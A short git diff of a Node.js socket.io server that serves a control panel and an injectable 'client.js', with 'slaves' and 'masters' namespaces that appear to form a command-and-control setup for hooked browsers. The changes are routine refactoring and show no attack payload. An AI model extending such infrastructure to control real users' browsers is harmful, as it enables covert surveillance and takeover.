@@ -15,7 +15,7 @@ let app = express();
 let http = require("http").createServer(app);
 let io = require("socket.io")(http);
 
-let control_panel_html_path = path.join(__dirname, "control_panel");
+let control_panel_path = path.join(__dirname, "control_panel", "dist");
 let client_html_path = path.join(__dirname, "..", "client");
 
 const package = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "package.json")));
@@ -96,6 +96,9 @@ let mod = {
 };
 Modules.importModules(mod);
 
+
+app.use("/", express.static(control_panel_path))
+
 app.get("/client/client.js", (req, res) => {
 	let payload = `window.nodeJsIp='${serverSettings.host}:${serverSettings.externalPort}';` + clientSrc;
 
@@ -114,7 +117,7 @@ io.origins((_, c) => c(null, true));
 let slaves = io.of("/slaves");
 let masters = io.of("/masters");
 
-slaves.on("connection", (socket) => {
+slaves.on("connect", (socket) => {
 	socket.ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress);
 
 	// Convert ipv4 "mapped" to ipv6 ips to ipv4
@@ -164,7 +167,7 @@ slaves.on("connection", (socket) => {
 	console.log("New slave connection from: " + socket.ip);
 });
 
-masters.on("connection", (socket) => {
+masters.on("connect", (socket) => {
 	socket.on("updateClientData", () => {
 
 		let data = [];
